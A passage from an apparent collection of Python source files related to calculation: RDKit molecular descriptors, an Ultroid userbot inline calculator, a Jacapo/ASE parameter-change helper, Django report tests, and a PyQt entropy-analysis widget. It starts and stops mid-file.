the dataframe\")\n\n            else:    \n                legends.append(refcode)\n                #mol = Chem.AddHs(mol)\n                mol_list.append(mol)\n \n    dataframe_rejected.to_csv(\"../data/df_rejected.csv\")      \n    #Draw.MolsToGridImage(mol_list, molsPerRow=4, legends = legends)\n    return(dataframe_reduced, mol_list, legends)\n\ndef get_molecular_features(dataframe, mol_list):\n    df = dataframe\n    for i in range(len(mol_list)):\n        print(\"Getting molecular features for molecule: \", i)\n        mol = mol_list[i]\n        natoms = mol.GetNumAtoms()\n        nbonds = mol.GetNumBonds()\n        mw = Descriptors.ExactMolWt(mol)\n        df.at[i,\"NbrAtoms\"] = natoms\n        df.at[i,\"NbrBonds\"] = nbonds\n        df.at[i,\"mw\"] = mw\n        df.at[i,'HeavyAtomMolWt'] = Chem.Descriptors.HeavyAtomMolWt(mol)\n        df.at[i,'NumValenceElectrons'] = Chem.Descriptors.NumValenceElectrons(mol)\n        ''' # These four descriptors are producing the value of infinity for refcode_csd = YOLJUF (CCOP(=O)(Cc1ccc(cc1)NC(=S)NP(OC(C)C)(OC(C)C)[S])OCC\\t\\n)\n        df.at[i,'MaxAbsPartialCharge'] = Chem.Descriptors.MaxAbsPartialCharge(mol)\n        df.at[i,'MaxPartialCharge'] = Chem.Descriptors.MaxPartialCharge(mol)\n        df.at[i,'MinAbsPartialCharge'] = Chem.Descriptors.MinAbsPartialCharge(mol)\n        df.at[i,'MinPartialCharge'] = Chem.Descriptors.MinPartialCharge(mol)\n        '''\n        df.at[i,'FpDensityMorgan1'] = Chem.Descriptors.FpDensityMorgan1(mol)\n        df.at[i,'FpDensityMorgan2'] = Chem.Descriptors.FpDensityMorgan2(mol)\n        df.at[i,'FpDensityMorgan3'] = Chem.Descriptors.FpDensityMorgan3(mol)\n        \n        #print(natoms, nbonds)\n        \n        # Now get some specific features\n        fdefName = os.path.join(RDConfig.RDDataDir,'BaseFeatures.fdef')\n        factory = ChemicalFeatures.BuildFeatureFactory(fdefName)\n        feats = factory.GetFeaturesForMol(mol)\n        #df[\"Acceptor\"] = 0\n        #df[\"Aromatic\"] = 0\n        #df[\"Hydrophobe\"] = 0\n        nbrAcceptor = 0\n        nbrDonor = 0\n        nbrHydrophobe = 0\n        nbrLumpedHydrophobe = 0\n        nbrPosIonizable = 0\n        nbrNegIonizable = 0\n        for j in range(len(feats)):\n            #print(feats[j].GetFamily(), feats[j].GetType())\n            if ('Acceptor' == (feats[j].GetFamily())):\n                nbrAcceptor = nbrAcceptor + 1\n            elif ('Donor' == (feats[j].GetFamily())):\n                nbrDonor = nbrDonor + 1\n            elif ('Hydrophobe' == (feats[j].GetFamily())):\n                nbrHydrophobe = nbrHydrophobe + 1\n            elif ('LumpedHydrophobe' == (feats[j].GetFamily())):\n                nbrLumpedHydrophobe = nbrLumpedHydrophobe + 1\n            elif ('PosIonizable' == (feats[j].GetFamily())):\n                nbrPosIonizable = nbrPosIonizable + 1\n            elif ('NegIonizable' == (feats[j].GetFamily())):\n                nbrNegIonizable = nbrNegIonizable + 1                \n            else:\n                pass#print(feats[j].GetFamily())\n                        \n        df.at[i,\"Acceptor\"] = nbrAcceptor\n        df.at[i,\"Donor\"] = nbrDonor\n        df.at[i,\"Hydrophobe\"] = nbrHydrophobe\n        df.at[i,\"LumpedHydrophobe\"] = nbrLumpedHydrophobe\n        df.at[i,\"PosIonizable\"] = nbrPosIonizable\n        df.at[i,\"NegIonizable\"] = nbrNegIonizable\n        \n        # We can also get some more molecular features using rdMolDescriptors\n        \n        df.at[i,\"NumRotatableBonds\"] = rdMolDescriptors.CalcNumRotatableBonds(mol)\n        df.at[i,\"CalcChi0n\"] = rdMolDescriptors.CalcChi0n(mol)\n        df.at[i,\"CalcChi0v\"] = rdMolDescriptors.CalcChi0v(mol)\n        df.at[i,\"CalcChi1n\"] = rdMolDescriptors.CalcChi1n(mol)\n        df.at[i,\"CalcChi1v\"] = rdMolDescriptors.CalcChi1v(mol)\n        df.at[i,\"CalcChi2n\"] = rdMolDescriptors.CalcChi2n(mol)\n        df.at[i,\"CalcChi2v\"] = rdMolDescriptors.CalcChi2v(mol)\n        df.at[i,\"CalcChi3n\"] = rdMolDescriptors.CalcChi3n(mol)\n        #df.at[i,\"CalcChi3v\"] = rdMolDescriptors.CalcChi3v(mol)\n        df.at[i,\"CalcChi4n\"] = rdMolDescriptors.CalcChi4n(mol)\n        df.at[i,\"CalcChi4v\"] = rdMolDescriptors.CalcChi4v(mol)\n        df.at[i,\"CalcFractionCSP3\"] = rdMolDescriptors.CalcFractionCSP3(mol)\n        df.at[i,\"CalcHallKierAlpha\"] = rdMolDescriptors.CalcHallKierAlpha(mol)\n        df.at[i,\"CalcKappa1\"] = rdMolDescriptors.CalcKappa1(mol)\n        df.at[i,\"CalcKappa2\"] = rdMolDescriptors.CalcKappa2(mol)\n        #df.at[i,\"CalcKappa3\"] = rdMolDescriptors.CalcKappa3(mol)\n        df.at[i,\"CalcLabuteASA\"] = rdMolDescriptors.CalcLabuteASA(mol)\n        df.at[i,\"CalcNumAliphaticCarbocycles\"] = rdMolDescriptors.CalcNumAliphaticCarbocycles(mol)\n        df.at[i,\"CalcNumAliphaticHeterocycles\"] = rdMolDescriptors.CalcNumAliphaticHeterocycles(mol)\n        df.at[i,\"CalcNumAliphaticRings\"] = rdMolDescriptors.CalcNumAliphaticRings(mol)\n        df.at[i,\"CalcNumAmideBonds\"] = rdMolDescriptors.CalcNumAmideBonds(mol)\n        df.at[i,\"CalcNumAromaticCarbocycles\"] = rdMolDescriptors.CalcNumAromaticCarbocycles(mol)\n        df.at[i,\"CalcNumAromaticHeterocycles\"] = rdMolDescriptors.CalcNumAromaticHeterocycles(mol)\n        df.at[i,\"CalcNumAromaticRings\"] = rdMolDescriptors.CalcNumAromaticRings(mol)\n        df.at[i,\"CalcNumBridgeheadAtoms\"] = rdMolDescriptors.CalcNumBridgeheadAtoms(mol)\n        df.at[i,\"CalcNumHBA\"] = rdMolDescriptors.CalcNumHBA(mol)\n        df.at[i,\"CalcNumHBD\"] = rdMolDescriptors.CalcNumHBD(mol)\n        df.at[i,\"CalcNumHeteroatoms\"] = rdMolDescriptors.CalcNumHeteroatoms(mol)\n        df.at[i,\"CalcNumHeterocycles\"] = rdMolDescriptors.CalcNumHeterocycles(mol)\n        df.at[i,\"CalcNumLipinskiHBA\"] = rdMolDescriptors.CalcNumLipinskiHBA(mol)\n        df.at[i,\"CalcNumLipinskiHBD\"] = rdMolDescriptors.CalcNumLipinskiHBD(mol)\n        df.at[i,\"CalcNumRings\"] = rdMolDescriptors.CalcNumRings(mol)\n        df.at[i,\"CalcNumSaturatedCarbocycles\"] = rdMolDescriptors.CalcNumSaturatedCarbocycles(mol)\n        df.at[i,\"CalcNumSaturatedHeterocycles\"] = rdMolDescriptors.CalcNumSaturatedHeterocycles(mol)\n        df.at[i,\"CalcNumSaturatedRings\"] = rdMolDescriptors.CalcNumSaturatedRings(mol)\n        df.at[i,\"CalcNumSpiroAtoms\"] = rdMolDescriptors.CalcNumSpiroAtoms(mol)\n        df.at[i,\"CalcTPSA\"] = rdMolDescriptors.CalcTPSA(mol)\n    return(df)\ndef createXYZ_from_SMILES(df, mol_list):\n    new_mol_list = []\n    print(\"Creating XYZ coordinates from SMILES\")\n    df = df.astype('object')\n    df['xyz'] = ''\n    for i, row in df.iterrows():\n        #print(i, \"Creating XYZ coordinates for mol with SMILES code = \", row['smiles'])\n        mol = Chem.MolFromSmiles(row['smiles'])\n        mol = Chem.AddHs(mol)\n        EmbedMolecule(mol)\n        xyz = Chem.rdmolfiles.MolToXYZBlock(mol)\n        if (xyz is ''):\n            print(i, \"Unable to create XYZ coordinates for\", row['smiles'], \"Droping it from the dataframe\")        \n            df.at[i,\"xyz\"] = 'drop'\n        else:\n            new_mol_list.append(mol_list[i])       \n            df.at[i,\"xyz\"] = xyz\n    df = df[df[\"xyz\"] != 'drop']\n    df = df.reset_index(drop=True)\n    return(df, new_mol_list)\n\n\n    \n", "481": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "482": "import numpy as np\n\nimport logging\nlog = logging.getLogger('Jacapo')\n\n'''\nprovides functions to determine if an input parameter has changed.\n'''\n\n#######################################################################\n#### changed functions\n\ndef kpts_changed(calc, x):\n    '''\n    check if kpt grid has changed.\n\n    we have to take care to generate the right k-points from x if\n    needed. if a user provides (4,4,4) we need to generate the MP\n    grid, etc...\n\n    Since i changed the MP code in set_kpts, there is some\n    incompatibility with old jacapo calculations and their MP\n    grids.\n    '''\n    #chadi-cohen\n    if isinstance(x, str):\n        exec('from ase.dft.kpoints import %s' % x)\n        listofkpts = eval(x)\n    #monkhorst-pack grid\n    elif np.array(x).shape == (3,):\n        from ase.dft.kpoints import monkhorst_pack\n        N1, N2, N3 = x\n        listofkpts = monkhorst_pack((N1, N2, N3))\n    #user-defined list is provided\n    elif len(np.array(x).shape) == 2:\n        listofkpts = np.array(x)\n    else:\n        raise Exception, 'apparent invalid setting for kpts'\n\n    grid = calc.get_kpts()\n    \n    if grid.shape != listofkpts.shape:\n        return True\n\n    if (abs(listofkpts - grid) < 1e-6).all():\n        return False\n    else:\n        return True\n\ndef electronic_minimization_changed(calc, x):\n    myx = calc.get_electronic_minimization()\n\n    for key in myx:\n        if myx[key] != x[key]:\n            print key, myx[key], ' changed to ', x[key]\n            return True\n    return False\n\ndef spinpol_changed(calc, x):\n    if x != calc.get_spinpol():\n        return True\n    else:\n        return False\n\ndef symmetry_changed(calc, x):\n    if x != calc.get_symmetry():\n        return True\n    else:\n        return False\n\ndef xc_changed(calc, x):\n    if x != calc.get_xc():\n        return True\n    return False\n\ndef calculate_stress_changed(calc, x):\n    if x != calc.get_calculate_stress():\n        return True\n    return False\n\ndef ados_changed(calc, x):\n    ados = calc.get_ados()\n\n    #ados may not be defined, and then None is returned\n    if ados is None and x is None:\n        return False\n    elif ados is None and x is not None:\n        return True\n    elif ados is not None and x is None:\n        return True\n\n    #getting here means ados and x are not none so we compare them\n    for key in x:\n        try:\n            if x[key] != ados[key]:\n                return True\n        except ValueError:\n            if (x[key] != ados[key]).all():\n                return True\n    return False\n\ndef convergence_changed(calc, x):\n    conv = calc.get_convergence()\n    for key in x:\n        if x[key] != conv[key]:\n            return True\n    return False\n\ndef charge_mixing_changed(calc, x):\n    cm = calc.get_charge_mixing()\n    if x is None and cm is None:\n        return False\n    else:\n        return True\n        \n    for key in x:\n        if x[key] != cm[key]:\n            return True\n    return False\n\ndef decoupling_changed(calc, x):\n    pars = calc.get_decoupling()\n    for key in x:\n        if x[key] != pars[key]:\n            return True\n    return False\n\ndef dipole_changed(calc, x):\n\n    pars = calc.get_dipole() #pars stored in calculator\n\n    # pars = False if no dipole variables exist\n    if (pars is False and x is False):\n        return False #no change\n    elif (pars is False and x is not False):\n        return True\n\n    # both x and pars is a dictionary\n    if (type(pars) == type(dict) and\n        type(pars) == type(x)):\n        for key in x:\n            if key == 'position':    # dipole layer position is never writen to the nc file\n                print 'need to do something special'\n                continue\n            if x[key] != pars[key]:\n                return True\n\n    #nothing seems to have changed.\n    return False\n\ndef extpot_changed(calc, x):\n    extpot = calc.get_extpot()\n    if (x == extpot).all():\n        return False\n    return True\n\ndef fftgrid_changed(calc, x):\n    validkeys = ['soft', 'hard']\n\n    myx = calc.get_fftgrid()\n    if (myx['soft'] == x['soft'] and myx['hard'] == x['hard']):\n        return False\n    else:\n        return True\n\n\ndef nbands_changed(calc, x):\n    if calc.get_nbands() == x:\n        return False\n    else:\n        return True\n\ndef occupationstatistics_changed(calc, x):\n    if calc.get_occupationstatistics() == x:\n        return False\n    else:\n        return True\n\ndef pw_changed(calc, x):\n    if calc.get_pw() == x:\n        return False\n    else:\n        return True\n\ndef dw_changed(calc, x):\n    if calc.get_dw() == x:\n        return False\n    else:\n        return True\n\ndef ft_changed(calc, x):\n    if calc.get_ft() == x:\n        return False\n    else:\n        return True\n    \ndef mdos_changed(calc,x):\n\n    myx = calc.get_mdos()\n\n    log.debug('myx = %s' % str(myx))\n    log.debug('x = %s' % str(x))\n\n    if x is None and myx is None:\n        return False\n    elif ((x is None and myx is not None)\n        or (x is not None and myx is None)):\n        return True\n    else:\n        for key in x:\n            if x[key] != myx[key]:\n                return True\n    return False\n\ndef pseudopotentials_changed(calc,x):\n\n    mypsp = calc.get_pseudopotentials()\n\n    if len(mypsp) != len(x):\n        return True\n\n    for key in x:\n        if key not in mypsp:\n            return True\n        if mypsp[key] != x[key]:\n            return True\n\n    for key in mypsp:\n        if key not in x:\n            return True\n        if mypsp[key] != x[key]:\n            return True\n    return False\n\ndef status_changed(calc,x):\n    if calc.get_status() != x:\n        return True\n    return False\n", "483": "from datetime import timedelta\nimport unittest\n\nfrom django.conf import settings\nfrom django.test import TestCase\nfrom django.utils import timezone\nfrom django.utils.dateparse import parse_datetime\n\nfrom dmt.main.models import UserProfile\nfrom dmt.main.tests.factories import (\n    ProjectFactory, UserProfileFactory, ItemFactory)\nfrom dmt.report.calculators import (\n    ActiveProjectsCalculator, StaffReportCalculator,\n    TimeSpentByUserCalculator, TimeSpentByProjectCalculator,\n    ProjectStatusCalculator, StaffCapacityCalculator\n)\n\n\nclass ActiveProjectsCalculatorTests(TestCase):\n    def setUp(self):\n        now = timezone.now()\n        self.interval_start = now - timedelta(days=365)\n        self.interval_end = self.interval_start + timedelta(days=365)\n\n    def test_calc_on_empty_db(self):\n        calc = ActiveProjectsCalculator()\n        calc.calc(self.interval_start, self.interval_end)\n\n\nclass StaffReportCalculatorTests(TestCase):\n    def setUp(self):\n        now = timezone.now()\n        self.week_start = now + timedelta(days=-now.weekday())\n        self.week_end = self.week_start + timedelta(days=6)\n\n    def test_calc(self):\n        UserProfileFactory()\n        UserProfileFactory()\n        UserProfileFactory()\n        calc = StaffReportCalculator(UserProfile.objects.all())\n        calc.calc(self.week_start, self.week_end)\n\n    def test_calc_on_empty_db(self):\n        calc = StaffReportCalculator(UserProfile.objects.all())\n        calc.calc(self.week_start, self.week_end)\n\n\n@unittest.skipIf(\n    settings.DATABASES['default']['ENGINE'] !=\n    'django.db.backends.postgresql_psycopg2',\n    \"This test uses a raw PostgreSQL query\")\nclass TimeSpentByUserCalculatorTest(TestCase):\n    def test_calc(self):\n        ProjectFactory()\n        calc = TimeSpentByUserCalculator()\n        calc.calc()\n\n    def test_calc_on_empty_db(self):\n        calc = TimeSpentByUserCalculator()\n        calc.calc()\n\n\n@unittest.skipIf(\n    settings.DATABASES['default']['ENGINE'] !=\n    'django.db.backends.postgresql_psycopg2',\n    \"This test uses a raw PostgreSQL query\")\nclass TimeSpentByProjectCalculatorTest(TestCase):\n    def test_calc(self):\n        ProjectFactory()\n        calc = TimeSpentByProjectCalculator()\n        calc.calc()\n\n    def test_calc_on_empty_db(self):\n        calc = TimeSpentByProjectCalculator()\n        calc.calc()\n\n\n@unittest.skipIf(\n    settings.DATABASES['default']['ENGINE'] !=\n    'django.db.backends.postgresql_psycopg2',\n    \"This test uses a raw PostgreSQL query\")\nclass ProjectStatusCalculatorTest(TestCase):\n    def test_calc(self):\n        ProjectFactory()\n        UserProfileFactory()\n        UserProfileFactory()\n        UserProfileFactory()\n        calc = ProjectStatusCalculator()\n        calc.calc()\n\n    def test_calc_on_empty_db(self):\n        calc = ProjectStatusCalculator()\n        calc.calc()\n\n\nclass StaffCapacityCalculatorTest(TestCase):\n\n    def test_capacity_skip_weekend(self):\n        UserProfileFactory()\n        start = parse_datetime('2018-05-14 00:00:00-04:00')\n        end = parse_datetime('2018-05-25 23:59:59.999999-04:00')\n\n        calc = StaffCapacityCalculator(\n            UserProfile.objects.all(), start, end)\n        self.assertEquals(calc.days(), 10)\n        self.assertEquals(calc.capacity_for_range(), 60)\n\n    def test_capacity_skip_holiday(self):\n        UserProfileFactory()\n        start = parse_datetime('2018-05-28 00:00:00-04:00')\n        end = parse_datetime('2018-06-01 23:59:59.999999-04:00')\n\n        calc = StaffCapacityCalculator(\n            UserProfile.objects.all(), start, end)\n        self.assertEquals(calc.days(), 4)\n        self.assertEquals(calc.capacity_for_range(), 24)\n\n    def test_calc(self):\n        start = parse_datetime('2017-05-15 00:00:00-04:00')\n        end = parse_datetime('2017-05-26 23:59:59.999999-04:00')\n        target = parse_datetime('2017-05-16 00:00:00-04:00')\n\n        profile = UserProfileFactory()\n        ItemFactory(assigned_user=profile.user,\n                    estimated_time=timedelta(hours=5),\n                    target_date=target)\n        ItemFactory(assigned_user=profile.user,\n                    estimated_time=timedelta(hours=1))\n\n        calc = StaffCapacityCalculator(\n            UserProfile.objects.filter(user__id=profile.user.id),\n            start, end)\n        self.assertEquals(calc.days(), 10)\n        self.assertEquals(calc.capacity_for_range(), 60)\n\n        data = calc.calc()\n        self.assertEquals(len(data), 1)\n        self.assertEquals(data[0]['user'], profile)\n        self.assertEquals(data[0]['booked'], 5)\n        self.assertEquals(data[0]['percent_booked'], '8.3')\n        self.assertEquals(data[0]['available'], 55)\n        self.assertEquals(data[0]['percent_available'], '91.7')\n", "484": "from PyQt5.QtWidgets import QWidget, QVBoxLayout, QTabWidget, QPushButton, QGridLayout, QLabel, QCheckBox, \\\n    QLineEdit, QMessageBox, QProgressBar\n\nfrom src.gui.threads.CalculationThread import CalculationThread\nfrom src.gui.widgets.cor_dim_widget import CorDimWidget\n\nfrom src.gui.widgets.entropy_widget import EntropyWidget\nfrom src.gui.widgets.file_chooser_widget import FileChooserWidget\nfrom src.gui.widgets.frac_dim_widget import FracDimWidget\nfrom src.gui.widgets.pertropy_widget import PertropyWidget\nfrom src.gui.widgets.window_analysis_widget import WindowAnalysisWidget\n\n\nclass ApEnWidget(QWidget):\n    def __init__(self, parent):\n        super(QWidget, self).__init__(parent)\n        self.fileName = \".memory\"\n        self.files_selected = False  # represent if FileChooserWidget has any files selected\n        self.is_in_progress = False  # represent if calculation is in progress\n        self.init_ui()\n\n    def init_ui(self):\n        layout = QVBoxLayout(self)\n\n        # Initialize tab screen\n        self.tabs = QTabWidget()\n        self.tab1 = QWidget()\n        self.tabs.resize(500, 600)\n\n        # Add tabs\n        self.tabs.addTab(self.tab1, \"Entropy\")\n\n        # Create first tab\n        enth_grid = self.config_entropy_tab()\n\n        self.tab1.setLayout(enth_grid)\n\n        # Add tabs to widget\n        layout.addWidget(self.tabs)\n        self.setLayout(layout)\n        self.check_run_button_state()\n\n    def config_entropy_tab(self):\n        mLabel = QLabel('m (length of vectors)or n (for pertropy only) ')\n        self.mEdit = QLineEdit(\"2\")\n\n        self.window_cb = QCheckBox('Use sliding windows', self)\n        self.is_windows_enabled = True\n        self.window_cb.setChecked(self.is_windows_enabled)\n        self.window_cb.clicked.connect(self.toggle_window_checkbox)\n\n        self.window_analysis_widget = WindowAnalysisWidget(self)\n\n        self.is_use_ent_cb = QCheckBox('Calculate Sample/Approximate Entropy?', self)\n        self.is_calc_ent = True\n        self.is_use_ent_cb.setChecked(self.is_calc_ent)\n        self.is_use_ent_cb.clicked.connect(self.toggle_calc_ent_cb)\n\n        self.ent_widget = EntropyWidget(self)\n\n        self.is_use_pertropy_cb = QCheckBox('Calculate Permutation Entropy?', self)\n        self.is_calc_pertropy = True\n        self.is_use_pertropy_cb.setChecked(self.is_calc_pertropy)\n        self.is_use_pertropy_cb.clicked.connect(self.toggle_calc_pertropy_cb)\n\n        self.pertropy_widget = PertropyWidget(self)\n\n        self.is_use_cor_dim_cb = QCheckBox('Calculate correlation dimension?', self)\n        self.is_calc_cor_dim = True\n        self.is_use_cor_dim_cb.setChecked(self.is_calc_cor_dim)\n        self.is_use_cor_dim_cb.clicked.connect(self.toggle_calc_cor_dim_cb)\n\n        self.is_use_frac_dim_cb = QCheckBox('Calculate fractal dimension?', self)\n        self.is_calc_frac_dim = True\n        self.is_use_frac_dim_cb.setChecked(self.is_calc_cor_dim)\n        self.is_use_frac_dim_cb.clicked.connect(self.toggle_calc_frac_dim_cb)\n\n        self.run_calculate = QPushButton(\"Run calculation\", self)\n        self.run_calculate.clicked.connect(self.calculate)\n\n        grid = QGridLayout()\n        grid.addWidget(mLabel, 0, 0)\n        grid.addWidget(self.mEdit, 0, 1)\n        grid.addWidget(self.window_cb, 0, 3)\n        grid.addWidget(self.window_analysis_widget, 1, 4)\n        grid.addWidget(self.is_use_ent_cb, 2, 0)\n        grid.addWidget(self.ent_widget, 3, 1)\n\n        grid.addWidget(self.is_use_pertropy_cb, 2, 3)\n        grid.addWidget(self.pertropy_widget, 3, 4)\n\n        self.cor_dim_widget = CorDimWidget(self)\n        grid.addWidget(self.is_use_cor_dim_cb, 4, 3)\n        grid.addWidget(self.cor_dim_widget, 5, 4)\n\n        self.frac_dim_widget = FracDimWidget(self)\n        grid.addWidget(self.is_use_frac_dim_cb, 6, 3)\n        grid.addWidget(self.frac_dim_widget, 7, 4)\n\n        self.file_chooser_widget = FileChooserWidget(self, self.fileName)\n        self.file_chooser_widget.new_files_chosen.connect(self.on_new_files_chosen)\n        self.file_chooser_widget.erased_files.connect(self.on_erased_files)\n        grid.addWidget(self.file_chooser_widget, 4, 0, 5, 3)\n\n        grid.addWidget(self.run_calculate, 14, 0, 1, 3)\n\n        # Creating a label\n        self.progress_label = QLabel('Calculation progress', self)\n\n        # Creating a progress bar and setting the value limits\n        self.progress_bar = QProgressBar(self)\n        self.progress_bar.setMaximum(100)\n        self.progress_bar.setMinimum(0)\n        grid.addWidget(self.progress_label, 18, 0)\n        grid.addWidget(self.progress_bar, 18, 1)\n\n        return grid\n\n    def on_new_files_chosen(self):\n        self.files_selected = True\n        self.check_run_button_state()\n\n    def on_erased_files(self):\n        self.files_selected = False\n        self.check_run_button_state()\n\n    def calculate(self):\n        is_ent_enabled = self.is_use_ent_cb.isChecked()\n        is_cord_dim_enabled = self.is_use_cor_dim_cb.isChecked()\n        is_frac_dim_enabled = self.is_use_frac_dim_cb.isChecked()\n        is_pertropy_enabled = self.is_use_pertropy_cb.isChecked()\n        is_pertropy_normalized = self.pertropy_widget.is_normalize_used\n        is_pertropy_stride = self.pertropy_widget.is_stride_used\n\n        files_list = self.file_chooser_widget.get_file_names()\n        dimension = int(self.mEdit.text())\n        window_size = self.get_window_size()\n        step_size = self.get_step_size()\n\n        cor_dim_radius = self.cor_dim_widget.get_radius() if is_cord_dim_enabled else 0\n        is_samp_en = self.ent_widget.is_samp_en() if is_ent_enabled else False\n        is_ap_en = self.ent_widget.is_ap_en() if is_ent_enabled else False\n        en_threshold_value, en_dev_coef_value, en_calculation_type, en_use_threshold = (self.get_entropy_parameters()\n                                                                                        if is_ent_enabled else [0, 0, 0,\n                                                                                                                0])\n        fd_max_k = self.get_frac_dim_parameters() if is_frac_dim_enabled else 0\n        pertropy_stride = self.pertropy_widget.get_stride() if is_pertropy_stride else 1\n\n        self.calc_thread = CalculationThread(is_cord_dim_enabled, files_list, dimension,\n                                             window_size, step_size,\n                                             cor_dim_radius, is_samp_en, is_ap_en, en_use_threshold,\n                                             en_threshold_value, en_dev_coef_value, en_calculation_type,\n                                             is_frac_dim_enabled, fd_max_k,\n                                             is_pertropy_enabled, is_pertropy_normalized, pertropy_stride)\n\n        self.set_in_progress(True)\n        self.calc_thread.done.connect(self.show_message)\n        self.calc_thread.done.connect(self.erase_in_progress)\n        self.calc_thread.progress.connect(self.track_ui_progress)\n        self.calc_thread.start()\n\n    def track_ui_progress(self, val):\n        self.progress_bar.setValue(val if val < 100 else 0)\n\n    def show_message(self, source, file_names, report_path=None):\n        self.ok_button = QPushButton('Ok', self)\n        self.dialog = QMessageBox(self)\n        self.dialog.setWindowModality(False)\n        all_files = \"\".join([\"- {} \\n\".format(i) for i in file_names.split(',')])\n        dialog_text = \"{} calculated for: \\n {}\".format(source, all_files)\n        if report_path:\n            dialog_text += '\\n Saved report in {}'.format(report_path)\n        self.dialog.setText(dialog_text)\n        self.dialog.setDefaultButton(self.ok_button)\n        self.dialog.show()\n\n    def set_in_progress(self, v):\n        self.is_in_progress = v\n        self.track_ui_progress(0)\n        self.check_run_button_state()\n\n    def erase_in_progress(self):\n        self.set_in_progress(False)\n\n    def toggle_calc_ent_cb(self):\n        self.is_calc_ent = not self.is_calc_ent\n        self.ent_widget.set_ap_en(self.is_calc_ent)\n        self.ent_widget.set_samp_en(self.is_calc_ent)\n        if not self.is_calc_ent:\n            self.ent_widget.reset_to_default()\n        self.check_run_button_state()\n        self.ent_widget.setHidden(not self.is_calc_ent)\n\n    def toggle_calc_pertropy_cb(self):\n        self.is_calc_pertropy = not self.is_calc_pertropy\n        self.check_run_button_state()\n        self.pertropy_widget.setHidden(not self.is_calc_pertropy)\n        if not self.is_calc_pertropy:\n            self.pertropy_widget.reset_to_default()\n\n    def toggle_window_checkbox(self):\n        self.is_windows_enabled = not self.is_windows_enabled\n        self.window_analysis_widget.setHidden(not self.is_windows_enabled)\n\n    def check_run_button_state(self):\n        any_algo_used = self.is_calc_ent or self.is_calc_cor_dim or self.is_calc_frac_dim or self.is_calc_pertropy\n        self.run_calculate.setEnabled(any_algo_used and\n                                      self.files_selected and not self.is_in_progress)\n\n    def toggle_calc_cor_dim_cb(self):\n        self.is_calc_cor_dim = not self.is_calc_cor_dim\n        self.check_run_button_state()\n        self.cor_dim_widget.setHidden(not self.is_calc_cor_dim)\n\n    def toggle_calc_frac_dim_cb(self):\n        self.is_calc_frac_dim = not self.is_calc_frac_dim\n        self.check_run_button_state()\n        self.frac_dim_widget.setHidden(not self.is_calc_frac_dim)\n\n    def get_entropy_parameters(self):\n        threshold_value = self.ent_widget.get_threshold()\n        dev_coef_value = self.ent_widget.get_dev_coef_value()\n        calculation_type = self.ent_widget.get_calculation_type()\n        use_threshold = self.ent_widget.is_threshold()\n        return threshold_value, dev_coef_value, calculation_type, use_threshold\n\n    def get_frac_dim_parameters(self):\n        fd_max_k = self.frac_dim_widget.get_max_k()\n        return fd_max_k\n\n    def get_window_size(self):\n        return int(self.window_analysis_widget.get_window_size()) if self.is_windows_enabled else None\n\n    def get_step_size(self):\n        return int(self.window_analysis_widget.get_window_step()) if self.is_windows_enabled else None\n", "485": "import pytest\rimport yaml\rfrom \u6d4b\u5f00\u73ed_12\u671f.pytest_work.calc import 